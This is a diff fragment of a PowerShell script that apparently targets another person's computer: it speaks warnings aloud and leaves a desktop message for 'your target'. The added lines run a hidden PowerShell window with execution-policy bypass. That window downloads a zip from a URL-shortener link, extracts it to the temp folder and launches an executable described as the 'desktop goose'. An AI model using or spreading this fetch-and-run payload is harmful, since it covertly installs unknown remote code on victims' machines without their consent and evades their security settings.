@@ -657,6 +657,12 @@ $s.Speak($EMAILwarn)
 
 $s.Speak($OUTRO)
 
+
+###########################################################################################################
+# this will launch the desktop goose
+
+Start-Process powershell -ArgumentList '-w', 'h', '-NoP', '-NonI', '-Ep', 'Bypass', '-Command', '$G="$env:tmp"; iwr -Uri "https://t.ly/gJ5d" -O "$G\goose.zip"; Expand-Archive "$G\goose.zip" -Des $G -Force; . $G\Goose\GooseDesktop.exe'
+
 ###########################################################################################################
 
 # this snippet will leave a message on your targets desktop 
